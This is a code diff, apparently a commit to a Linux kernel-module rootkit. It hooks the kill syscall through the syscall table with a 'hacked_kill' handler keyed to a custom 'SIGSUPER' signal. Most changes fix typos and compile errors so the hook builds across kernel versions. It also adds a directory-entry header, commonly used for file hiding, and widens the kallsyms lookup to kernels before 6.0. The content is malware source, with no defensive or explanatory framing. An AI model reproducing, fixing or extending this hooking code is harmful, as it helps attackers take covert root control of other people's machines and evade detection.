@@ -5,9 +5,8 @@
 #include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
 #include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
 #include <linux/unistd.h>           // contains syscall numbers
-#include <linux/version.h>         // linux/ kernel versions 
-#include <asm/paravirit.h>         // contains function for read_cr0()
-
+#include <linux/version.h>         // linux kernel versions 
+#include <linux/dirent.h>	   //contains dirent structs etc
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("infernexio");
@@ -19,13 +18,13 @@ unsigned long *__sys_call_table = NULL;
 #ifdef CONFIG_X86_64
 /* on 64-bit x86 and kernel v4.17 syscalls are nolonger
  allowed to be called form the kernel*/
-#if LINUX_VERSION_CODE >= KERNERL_VERSION(4,17,0)
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0)
 #define PTREGS_SYSCALL_STUB 1
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
-satic ptregs_t orig_kill;
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
+static ptregs_t orig_kill;
 #else
-typedef asmlinkage long (*orig_kill_t)(pid_t pis, int sig);
-static orig_killl_t orig_kill
+typedef asmlinkage long (*orig_kill_t)(pid_t pid, int sig);
+static orig_kill_t orig_kill;
 #endif
 #endif
 
@@ -35,7 +34,7 @@ enum signals{
 };
 
 #if PTREGS_SYSCALL_STUB
-static asmlikage long hacked_kill(const struct pt_regs *regs){
+static asmlinkage long hacked_kill(const struct pt_regs *regs){
     int sig = regs->si;
     
     if(sig == SIGSUPER){
@@ -79,15 +78,15 @@ static int cleanup(void){
 */
 static int store(void){
 /* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
-#if PTREGES_SYSCALL_STUB
+#if PTREGS_SYSCALL_STUB
     /* kill */
-    orig_kill = (ptregs_t)__sys_call_table[__NR_kill]
+    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
 
 /* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
 #else
     /* kill */
-    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill]
+    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill];
     printk(KERN_INFO "orig_kill table entry successfully sotred\n");
 #endif
 
@@ -136,12 +135,13 @@ static void protect_memory(void){
 static unsigned long *get_syscall_table(void){
     unsigned long *syscall_table;
 
-    #if LINUX_VERSION_CODE < KERNEL_VERSION(5,4,0)
+#if LINUX_VERSION_CODE < KERNEL_VERSION(6,0,0)
         syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
     #else
         syscall_table = NULL;
     #endif
 
+	//printk(KERN_INFO "syscaltable value: %ln",syscall_table);
         return syscall_table;
 }
 
